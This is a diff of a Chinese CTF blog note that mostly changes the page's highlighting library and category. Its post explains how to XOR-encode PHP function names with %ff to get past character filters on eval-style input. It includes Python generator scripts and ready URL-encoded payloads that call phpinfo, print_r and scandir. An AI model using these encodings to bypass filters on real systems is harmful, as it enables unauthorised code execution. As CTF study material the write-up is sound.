@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -192,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      455 字
+      431 字
     </span>
   
 
@@ -202,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      6
        分钟
     </span>
   
@@ -240,51 +248,51 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 个月前
+                  本文最后更新于：17 分钟前
                 
               </p>
             
             <div class="markdown-body">
               <h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p>
-<div class="hljs"><pre><code>1^1=0  
+<pre><code>1^1=0  
 1^0=1
-0^0=0   </code></pre></div>
+0^0=0   </code></pre>
 <p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png" srcset="/img/loading.gif">       </p>
-<div class="hljs"><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##要异或的</span>
-temp=[]
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
-    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))
+<pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'phpinfo'</span>     <span class="token comment">##要异或的</span>
+temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+    temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:
-    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)
-print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></div></code></pre>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> temp<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span><span class="token string">'%ff'</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></code></pre>
 <p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p>
 <h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )
-    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></div></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></code></pre>
 <p>这个是限定所用的字符种类小于或等于13       </p>
 <p>看看有没有那个字符可以由其它的异或而来    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png" srcset="/img/loading.gif">      </p>
-<div class="hljs"><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span>
+<pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'\'().;_acdinprst'</span>
 
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
-    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:
-        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:
-            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:
-                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):
-                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):
-                        <span class="hljs-keyword">continue</span>
-                    <span class="hljs-keyword">else</span>:
-                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></div></code></pre>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> m <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> n <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>m <span class="token keyword">or</span> j<span class="token operator">==</span>n <span class="token keyword">or</span> m<span class="token operator">==</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">continue</span>
+                    <span class="token keyword">else</span><span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>n<span class="token punctuation">)</span></code></pre></code></pre>
 <p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png" srcset="/img/loading.gif">        </p>
 <p>随便选三个   </p>
-<div class="hljs"><pre><code>c==d^n^i
+<pre><code>c==d^n^i
 d==c^i^n
 i==c^n^d
 
 
 
-c^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre></div>
+c^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre>
 <p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p>
 <p>scandir也换后     </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png" srcset="/img/loading.gif">   </p>
@@ -298,9 +306,7 @@ c^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre></div>
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/or-or/">or^or</a>
+                      <a class="hover-with-bg" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>
                     
                   </div>
                 
@@ -446,6 +452,8 @@ c^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre></div>
 
 
 
+  
+    
   
 
 
